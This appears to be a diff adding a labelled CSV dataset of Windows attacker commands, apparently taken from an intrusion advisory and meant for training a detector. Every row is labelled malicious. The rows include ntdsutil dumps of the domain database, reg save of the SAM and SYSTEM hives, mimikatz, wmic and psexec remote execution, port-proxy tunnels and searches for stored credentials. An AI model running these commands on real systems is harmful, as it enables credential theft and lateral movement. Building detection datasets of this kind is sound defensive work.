@@ -1,0 +1,73 @@
+Command,Label
+"arp.exe -a
+curl.exe www.ip-api[.]com
+dnscmd . /enumrecords /zone {REDACTED}
+dnscmd . /enumzones
+dnscmd /enumrecords {REDACTED} . /additional
+ipconfig.exe /all
+ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
+net.exe localgroup administrators
+net.exe group /dom net.exe group ""Domain Admins"" /dom
+netsh.exe interface firewall show all
+netsh.exe interface portproxy show all
+netsh.exe interface portproxy show v4tov4
+netsh.exe firewall show all
+netsh.exe portproxy show v4tov4
+netstat -ano
+reg.exe query hklm\software\
+systeminfo.exe
+tasklist.exe /v
+whoami.exe
+wmic.exe volume list brief
+wmic.exe service brief
+wmic.exe product list brief
+wmic.exe baseboard list full
+wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]",1
+"wmic.exeprocess call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""",1
+"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PortProxy\v4tov4
+\cp\0.0.0.0/49275 | {redacted IP address}/8443.",1
+"cmd.exe /Q /c wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1",1
+"wmic.exe process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro",1
+"""cmd.exe"" /c wmic.exe process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""",1
+"Get-EventLog security -instanceid 4624 -after
+{redacted date} | fl * | Out-File
+'C:\users\public\documents\user.dat'",1
+"wmic.exeprocess call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\",1
+"C:\{redacted}\
+logins.ps1",1
+"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z.exe C:\Windows\system32\pcwrun.exe
+C:\Users\Administrator\Desktop\Win.exe
+C:\Windows\System32\cmdbak.exe /c ping.exe -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
+""cmd.exe"" /c dir \\127.0.0.1\C$ /od
+""cmd.exe"" /c ping.exe –a –n 1 <IP address>
+""cmd.exe"" /c wmic.exe /user:<username> /password:<password> process call create ""net.exe stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
+net.exe use \\127.0.0.1\IPC$ /y /d
+powershell.exe start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
+rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
+wmic.exe /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami.exe
+xcopy.exe C:\windows\temp\hp d:\{REDACTED}",1
+"wmic.exeprocess call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro",1
+"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",1
+"ntdsutil snapshot “ac i ntds”
+create quit quit",1
+"C:\Windows\NTDS\ntds.dit' to
+'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
+opy1\Windows\NTDS\ntds.dit'",1
+"""C:\pstools\psexec.exe"" {REDACTED} -s cmd /c ""cmd.exe /c netsh.exe interface portproxy delete v4tov4 listenaddress=0.0.0.0
+listenport=9999",1
+"dir C:\Users\{REDACTED}\.ssh\known_hosts
+dir C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
+mimikatz.exe
+reg.exe query hklm\software\OpenSSH
+reg.exe query hklm\software\OpenSSH\Agent
+reg.exe query hklm\software\realvnc
+reg.exe query hklm\software\realvnc\vncserver
+reg.exe query hklm\software\realvnc\Allusers
+reg.exe query hklm\software\realvnc\Allusers\vncserver
+reg.exe query hkcu\software\{REDACTED}\putty\session
+reg.exe save hklm\sam ss.dat
+reg.exe save hklm\system sy.dat",1
+"Get-EventLog security -instanceid 4624 | Where-
+Object {$_.message.contains('{redacted user
+account}')} | select -First 1 | fl",1
